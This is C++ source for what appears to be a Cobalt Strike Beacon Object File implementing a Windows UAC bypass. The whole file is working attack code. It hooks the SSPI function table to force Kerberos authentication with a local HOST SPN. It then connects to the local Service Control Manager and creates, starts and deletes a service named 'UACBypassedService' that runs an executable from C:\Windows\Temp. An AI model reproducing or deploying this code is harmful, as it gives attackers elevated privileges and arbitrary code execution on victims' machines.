#include <Windows.h>
#include "base\helpers.h"

#define SECURITY_WIN32
#include <sspi.h>
#include <security.h>

#pragma comment(lib, "Secur32.lib")

static WCHAR spn[] = L"HOST/";

extern "C" {
#include "beacon.h"

    WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t* _Str1, const wchar_t* _Str2);
    WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* _Dest, const wchar_t* _Source);

    SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(
        _In_opt_  LPWSTR pszPrincipal,
        _In_      LPWSTR pszPackage,
        _In_      unsigned long fCredentialUse,
        _In_opt_  void* pvLogonId,
        _In_opt_  void* pAuthData,
        _In_opt_  SEC_GET_KEY_FN pGetKeyFn,
        _In_opt_  void* pvGetKeyArgument,
        _Out_     PCredHandle phCredential,
        _Out_opt_ PTimeStamp ptsExpiry
    )
    {
        DFR_LOCAL(SECUR32, AcquireCredentialsHandleW);

        formatp buffer;
        WCHAR   kerberos_package[] = MICROSOFT_KERBEROS_NAME_W;

        BeaconFormatAlloc(&buffer, 1024);
        BeaconFormatPrintf(&buffer, "AcquireCredentialsHandleHook called for package %ls\n", pszPackage);
        
        if (MSVCRT$_wcsicmp(pszPackage, L"Negotiate") == 0) {
            pszPackage = kerberos_package;
            BeaconFormatPrintf(&buffer, "Changing to %ls package\n", pszPackage);
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&buffer, NULL));
        BeaconFormatFree(&buffer);

        return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse,
            pvLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);
    }

    SECURITY_STATUS SEC_ENTRY InitializeSecurityContextWHook(
        _In_opt_    PCredHandle phCredential,
        _In_opt_    PCtxtHandle phContext,
        _In_opt_ SEC_WCHAR* pszTargetName,
        _In_        unsigned long fContextReq,
        _In_        unsigned long Reserved1,
        _In_        unsigned long TargetDataRep,
        _In_opt_    PSecBufferDesc pInput,
        _In_        unsigned long Reserved2,
        _Inout_opt_ PCtxtHandle phNewContext,
        _Inout_opt_ PSecBufferDesc pOutput,
        _Out_       unsigned long* pfContextAttr,
        _Out_opt_   PTimeStamp ptsExpiry
    )
    {
        DFR_LOCAL(SECUR32, InitializeSecurityContextW);

        formatp buffer;
        BeaconFormatAlloc(&buffer, 1024);
        BeaconFormatPrintf(&buffer, "InitializeSecurityContext called for target %ls\n", pszTargetName);

        SECURITY_STATUS status = InitializeSecurityContextW(phCredential, phContext, spn,
            fContextReq, Reserved1, TargetDataRep, pInput,
            Reserved2, phNewContext, pOutput, pfContextAttr, ptsExpiry);

        BeaconFormatPrintf(&buffer, "InitializeSecurityContext status = %08X\n", status);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&buffer, NULL));
        BeaconFormatFree(&buffer);

        return status;
    }

    void go(char* args, int len) {

        DFR_LOCAL(KERNEL32, GetLastError);
        DFR_LOCAL(SECUR32,  InitSecurityInterfaceW);
        DFR_LOCAL(KERNEL32, GetComputerNameW);
        DFR_LOCAL(ADVAPI32, OpenSCManagerW);
        DFR_LOCAL(ADVAPI32, CreateServiceW);
        DFR_LOCAL(ADVAPI32, StartServiceW);
        DFR_LOCAL(KERNEL32, Sleep);
        DFR_LOCAL(ADVAPI32, DeleteService);
        DFR_LOCAL(ADVAPI32, CloseServiceHandle);

        PSecurityFunctionTableW table = InitSecurityInterfaceW();
        table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;
        table->InitializeSecurityContextW = InitializeSecurityContextWHook;

        WCHAR computer_name[1000];
        DWORD size = _countof(computer_name);
        if (!GetComputerNameW(computer_name, &size))
        {
            BeaconPrintf(CALLBACK_ERROR, "Error getting computer name %d\n", GetLastError());
            return;
        }

        MSVCRT$wcscat(spn, computer_name);

        SC_HANDLE hScm = OpenSCManagerW(L"127.0.0.1", nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
        if (!hScm)
        {
            BeaconPrintf(CALLBACK_ERROR, "Error opening SCM %d\n", GetLastError());
            return;
        }

        SC_HANDLE hService = CreateServiceW(hScm, L"UACBypassedService", nullptr, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, L"C:\\Windows\\Temp\\UACBypassedService.exe", nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!hService)
        {
            BeaconPrintf(CALLBACK_ERROR, "Error creating service %d\n", GetLastError());
            return;
        }

        if (!StartServiceW(hService, 0, nullptr))
        {
            BeaconPrintf(CALLBACK_ERROR, "Error starting service %d\n", GetLastError());
            return;
        }

        Sleep(3000);

        DeleteService(hService);
        CloseServiceHandle(hService);
        CloseServiceHandle(hScm);
    }
}